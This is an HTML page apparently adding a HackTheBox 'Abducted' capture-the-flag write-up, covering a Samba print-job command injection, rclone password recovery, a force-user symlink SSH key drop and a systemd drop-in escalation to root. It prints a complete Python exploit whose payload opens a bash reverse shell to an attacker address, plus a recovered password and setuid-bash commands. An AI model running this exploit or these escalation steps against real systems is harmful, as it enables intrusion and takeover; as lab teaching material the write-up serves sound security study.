@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>Abducted — HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox Abducted (Medium, Linux) full write up: Samba print command injection (CVE-2026-4480) → rclone password decode → force user symlink SSH key drop → polkit-delegated systemd service → root."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--panel-bg:rgba(255,255,255,.03);--border:rgba(255,255,255,.06);--rose:#a855f7;--rose-dim:rgba(168,85,247,.15);--emerald:#34d399;--emerald-dim:rgba(52,211,153,.1);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08) 0%,transparent 50%),radial-gradient(circle at 80% 80%,rgba(52,211,153,.04) 0%,transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}
+@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}
+.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:var(--panel-bg);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em;transition:all .3s ease}
+.back-btn:hover{color:#c084fc;border-color:rgba(168,85,247,.5)}
+.back-btn svg{transition:transform .3s ease}
+.back-btn:hover svg{transform:translateX(-4px)}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;position:relative;overflow:hidden}
+.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}
+@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}
+h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-transform:uppercase;margin-bottom:1.5rem}
+@media(min-width:768px){h1{font-size:2.5rem}}
+.writeup-body h2{font-size:1.25rem;font-weight:700;color:#c084fc;margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.writeup-body h3{font-size:1rem;font-weight:700;color:#34d399;margin:1.5rem 0 .75rem}
+.writeup-body p{color:var(--muted);font-size:.95rem;line-height:1.75;margin-bottom:1rem}
+.writeup-body ul,.writeup-body ol{color:var(--muted);font-size:.95rem;line-height:1.75;margin:0 0 1rem 1.25rem}
+.writeup-body li{margin-bottom:.25rem}
+.writeup-body strong{color:var(--text)}
+.writeup-body code{font-family:'JetBrains Mono','Fira Code',monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:#c084fc;padding:2px 6px;border-radius:6px}
+.writeup-body pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.8rem;color:var(--emerald);line-height:1.6;white-space:pre-wrap;word-wrap:break-word;overflow-wrap:anywhere}
+.writeup-body pre code{background:none;color:inherit;padding:0;border-radius:0}
+.section-tag{display:inline-block;padding:2px 10px;border-radius:9999px;font-size:.7rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase}
+.tag-medium{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.3);color:#fbbf24}
+.tag-linux{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:#34d399}
+.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}
+@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}
+.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}
+.info-cell .lbl{color:var(--dim);font-size:.65rem;font-family:'JetBrains Mono','Fira Code',monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}
+.info-cell .val{color:var(--text);font-size:.9rem;font-weight:600}
+.footer{text-align:center;padding-top:3rem;color:var(--dim);font-size:10px;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.15em;text-transform:uppercase}
+.fade-in{opacity:0;transform:translateY(20px);transition:opacity .6s ease,transform .6s ease}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+</style>
+</head>
+<body>
+<div class="cyber-grid"></div>
+
+<main>
+<div class="max-w">
+  <div class="nav-row fade-in">
+    <a href="../writeups.html" class="back-btn">
+      <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+      Write Ups
+    </a>
+    <a href="../index.html" class="back-btn">Home</a>
+  </div>
+
+  <div class="panel fade-in">
+    <div class="writeup-body">
+
+      <p class="meta">hackthebox / medium / linux</p>
+      <h1>Abducted</h1>
+
+      <div class="info-grid">
+        <div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div>
+        <div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="section-tag tag-medium">Medium</span></div></div>
+        <div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="section-tag tag-linux">Linux</span></div></div>
+      </div>
+
+      <h2>Synopsis</h2>
+      <p>Abducted is a medium-difficulty Linux machine built around the on-premise file and print server of a professional-services firm.</p>
+      <p>The Samba installation is vulnerable to a <strong>print-subsystem command injection (CVE-2026-4480)</strong>: the client-supplied print job name is passed to the configured print command without escaping. A crafted job submitted over the spooler protocol yields code execution as the print service account.</p>
+      <p>An offsite-backup configuration is recovered and its password decoded with rclone's own tooling (reused for a system account). A second Samba share configured with <code>force user</code> and <code>wide links</code> is abused to write an SSH key into a second user's home directory. That user belongs to a group delegated management of the Samba service through polkit, and a service drop-in is used to execute a command as root.</p>
+
+      <h2>Skills Required</h2>
+      <ul>
+        <li>SMB Enumeration</li>
+        <li>Identifying Service Versions</li>
+      </ul>
+
+      <h2>Skills Learned</h2>
+      <ul>
+        <li>Samba print job name Command Injection (<strong>CVE-2026-4480</strong>)</li>
+        <li>Decoding rclone Obscured Credentials</li>
+        <li>Abusing Samba force user + wide links</li>
+        <li>Privilege Escalation via a polkit-delegated systemd service</li>
+      </ul>
+
+      <h2>Enumeration</h2>
+      <p>Start enumeration with an Nmap scan. No web service is present — the host exposes <strong>SSH</strong> and a <strong>Samba</strong> server.</p>
+      <pre>nmap -sSVC --open -Pn 10.129.244.177</pre>
+      <p><strong>Key ports:</strong></p>
+      <ul>
+        <li><strong>22/tcp</strong> → OpenSSH 9.6p1 Ubuntu</li>
+        <li><strong>139/445/tcp</strong> → Samba smbd 4</li>
+      </ul>
+      <pre>smbclient -L //10.129.244.177 -N</pre>
+      <p><strong>Shares:</strong></p>
+      <ul>
+        <li><strong>HP-Reception</strong> (Printer) — allows guest printing</li>
+        <li><strong>projects</strong> (Disk)</li>
+        <li><strong>transfer</strong> (Disk)</li>
+        <li>IPC$</li>
+      </ul>
+      <pre>rpcclient -U "" -N 10.129.244.177 -c "srvinfo"</pre>
+      <p>The server identifies as Ubuntu Linux. The exact Samba version is hard to pin remotely, but the presence of a guest-accessible printer share makes <strong>CVE-2026-4480</strong> the most likely vector.</p>
+
+      <h2>Foothold — CVE-2026-4480 (Print Command Injection)</h2>
+      <p>Samba's print command (when using <code>printing = sysv</code>) substitutes <code>%J</code> (job name) directly into a <code>system()</code> call without proper sanitization.</p>
+      <p><strong>Exploit flow:</strong></p>
+      <ol>
+        <li>Connect to the spoolss RPC interface anonymously.</li>
+        <li>Submit a print job with a malicious <code>document_name</code> (<code>%J</code>).</li>
+        <li>The spool file body (<code>%s</code>) becomes the shell script.</li>
+      </ol>
+
+      <h3>Exploit script (exploit.py)</h3>
+      <pre>#!/usr/bin/env python3
+from samba.dcerpc import spoolss
+from samba.param import LoadParm
+from samba.credentials import Credentials
+
+RHOST, LHOST, LPORT = "10.129.244.177", "10.10.14.100", 4444
+
+DATA = (f"setsid bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' &gt;/dev/null 2>&amp;1 &amp;\n").encode()
+
+lp = LoadParm(); lp.load_default()
+creds = Credentials(); creds.guess(lp); creds.set_anonymous()
+
+iface = spoolss.spoolss(rf"ncacn_np:{RHOST}[\pipe\spoolss]", lp, creds)
+
+h = iface.OpenPrinter(f"\\\\{RHOST}\\HP-Reception", "", spoolss.DevmodeContainer(), 0x00000008)
+
+i1 = spoolss.DocumentInfo1()
+i1.document_name = "|sh"
+i1.output_file = None
+i1.datatype = "RAW"
+
+ctr = spoolss.DocumentInfoCtr()
+ctr.level = 1
+ctr.info = i1
+
+iface.StartDocPrinter(h, ctr)
+iface.StartPagePrinter(h)
+iface.WritePrinter(h, DATA, len(DATA))
+iface.EndPagePrinter(h)
+iface.EndDocPrinter(h)
+iface.ClosePrinter(h)
+
+print("[+] job submitted")</pre>
+
+      <p><strong>Usage:</strong></p>
+      <pre>nc -lvnp 4444
+python3 exploit.py</pre>
+      <p>You land a shell as <strong>nobody</strong>.</p>
+
+      <h2>Post-Exploitation &amp; User Flag</h2>
+      <pre>nobody@abducted:/$ cat /opt/offsite-backup/rclone.conf
+nobody@abducted:/$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
+iXzvcib3SrpZ</pre>
+      <p>The password is reused for the <strong>scott</strong> account.</p>
+      <pre>ssh scott@10.129.244.177
+scott@abducted:~$ cat user.txt</pre>
+
+      <h2>Privilege Escalation — scott → marcus</h2>
+      <p>The <strong>transfer</strong> share has:</p>
+      <ul>
+        <li><code>force user = marcus</code></li>
+        <li><code>wide links = yes</code></li>
+        <li><code>allow insecure wide links = yes</code></li>
+      </ul>
+      <pre>scott@abducted:~$ cat /etc/samba/shares.conf</pre>
+      <p><strong>Attack:</strong></p>
+      <ol>
+        <li>Generate SSH key</li>
+        <li>Create symlink to <code>/home/marcus</code></li>
+        <li>Write <code>authorized_keys</code> via Samba (runs as marcus due to force user)</li>
+      </ol>
+      <pre>scott@abducted:~$ ssh-keygen -q -t ed25519 -N '' -f /tmp/k
+scott@abducted:~$ ln -s /home/marcus /srv/transfer/mh
+scott@abducted:~$ smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
+  -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'</pre>
+      <pre>ssh -i /tmp/k marcus@10.129.244.177</pre>
+
+      <h2>Privilege Escalation — marcus → root</h2>
+      <p><strong>marcus</strong> is in the <code>operators</code> group, which has write access to:</p>
+      <pre>marcus@abducted:~$ ls -ld /etc/systemd/system/smbd.service.d
+drwxrws--- 2 root operators ...</pre>
+      <p>This is a <strong>systemd drop-in</strong> directory for <code>smbd.service</code>. <strong>marcus</strong> can also run <code>systemctl daemon-reload</code> and <code>systemctl restart smbd</code> via <strong>polkit</strong> without a password.</p>
+      <p><strong>Exploit:</strong></p>
+      <pre>marcus@abducted:~$ cat &gt; /etc/systemd/system/smbd.service.d/override.conf &lt;&lt;'EOF'
+[Service]
+ExecStartPre=/bin/cp /bin/bash /tmp/.rb
+ExecStartPre=/bin/chmod 4755 /tmp/.rb
+EOF
+
+marcus@abducted:~$ systemctl daemon-reload
+marcus@abducted:~$ systemctl restart smbd
+
+marcus@abducted:~$ /tmp/.rb -p -c 'id; cat /root/root.txt'</pre>
+
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li><strong>Print subsystems are an RCE surface</strong> — unescaped job names passed to <code>system()</code> in the print command turn a spooler submission into command injection.</li>
+        <li><strong>rclone's "obscured" passwords are reversible</strong> with the same tooling (<code>rclone reveal</code>); they are obfuscation, not encryption.</li>
+        <li><strong>Samba <code>force user</code> + <code>wide links</code></strong> is a classic write primitive: a symlink lets a low-priv user write files as another user.</li>
+        <li><strong>polkit-delegated systemd management</strong> + a writable drop-in directory == arbitrary root command execution via <code>ExecStartPre</code>.</li>
+      </ul>
+
+    </div>
+  </div>
+
+  <p class="footer">pumkin / write ups</p>
+</div>
+</main>
+
+<script>
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('visible');
+    }
+  });
+}, { threshold: 0 });
+
+document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+</script>
+</body>
+</html>
